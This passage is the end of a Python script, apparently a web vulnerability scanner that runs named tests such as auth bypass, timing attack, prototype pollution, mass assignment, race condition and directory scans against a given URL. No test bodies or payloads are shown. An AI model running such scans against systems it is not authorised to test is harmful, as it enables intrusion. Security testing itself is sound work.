        scanner.api_auth_bypass_test(args.url)
        scanner.timing_attack_test(args.url)
        scanner.prototype_pollution_test(args.url)
        scanner.mass_assignment_test(args.url)
        scanner.info_disclosure(args.url)
        scanner.api_endpoint_scan(args.url)
        scanner.backup_file_scan(args.url)
        scanner.directory_scan(args.url)
        scanner.race_condition_test(args.url)
    
    print("\n[*] Scan complete")

if __name__ == "__main__":
    main()
